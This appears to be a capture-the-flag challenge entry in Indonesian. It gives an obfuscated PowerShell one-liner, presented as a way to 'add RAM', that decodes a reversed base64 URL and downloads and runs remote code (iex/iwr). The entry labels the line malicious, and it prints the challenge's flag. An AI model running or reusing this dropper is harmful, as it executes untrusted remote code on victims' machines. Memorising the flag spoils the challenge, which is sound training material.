# download RAM

## Author

requiiem

## Difficulty

Hard

## Description

Kata temen ku ini script yang bisa dipake buat nambah RAM. Tapi kok foto kesukaan ku jadi gini yak?

```
$r='xMHcuUGd5JWYnl2ZtIzMv4Wah12LtFmctUGZhJ3ZwV3LlVXcu9Ga4BzLt92YuQnblRnbvNmclNXdiVHa0l2ZucXYy9yL6MHc0RHa';$b=($r[-1..-($r.Length)] -join '');$u=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b));iex (iwr $u -UseBasicParsing)
```

ps. malicious btw

## Flag

`SCH25{Strangers_passing_in_the_street__By_chance,_two_separate_glances_meet__And_I_am_you_and_what_I_see_is_me__And_do_I_take_you_by_the_hand__And_lead_you_through_the_land__And_help_me_understand_the_best_I_can?___requiiem_wuzz_here}`
